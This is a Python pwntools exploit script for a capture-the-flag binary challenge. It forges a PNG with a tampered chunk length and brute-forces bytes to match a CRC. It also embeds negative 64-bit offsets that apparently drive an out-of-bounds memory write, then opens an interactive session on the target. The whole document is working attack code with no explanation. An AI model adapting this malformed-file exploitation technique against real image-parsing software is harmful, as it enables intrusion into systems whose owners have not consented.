#!/usr/bin/python

from pwn import *
import sys
from PIL import Image

remote_ip, port = 'mc.ax', 31412
binary = './chal'
brkpts = '''
b*0x40158e
b*0x4015f9
b*0x40132e
b*0x4012e9
'''

elf = ELF("chal")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary)

def init_image():
    img = Image.new('RGB',(60,30), color= 'red')
    img.save('img.png')

def init_crc():
    crc_table = [i for i in range(256)]
    for i in range(256):
        v1 = i
        for j in range(8):
            if ( (v1 & 1) != 0 ):
                v1 = (v1 >> 1) ^ 0xedb88320
            else:
                v1 >>= 1
        crc_table[i] = v1
    
    return crc_table

def update_crc(payload, crc_table):
    v4 = 0xffffffff
    for i in range(len(payload)):
        val = (v4 ^ ord(payload[i])) & 0xff
        v4 = (v4 >> 8) ^ crc_table[val]
    return (0xffffffff - v4) & 0xffff

def solve():
    table = init_crc()
    for i in range(256):
        for j in range(256):
            for k in range(256):
                payload = chr(i) + chr(j) + chr(k)
                payload += p64(0xffffffffffffff21) + p64(0xffffffffffbfec28) + p64(0xffffffffffbfeb15)
                if update_crc(payload, table) == 0x1814:
                    return i, j, k

if __name__ == "__main__":
    init_image()
    f = open("img.png","rb")
    data = f.read()[:33]
    data += "\x00\x00\x00{}".format(chr(0x18-1))
    i, j, k = solve()
    data += chr(i) + chr(j) + chr(k)

    sla("file?\n\n", str(len(data)))
    sa("here:\n\n",data)
    gdb.attach(io, brkpts)
    sla("colors?\n", "y")

    io.interactive()
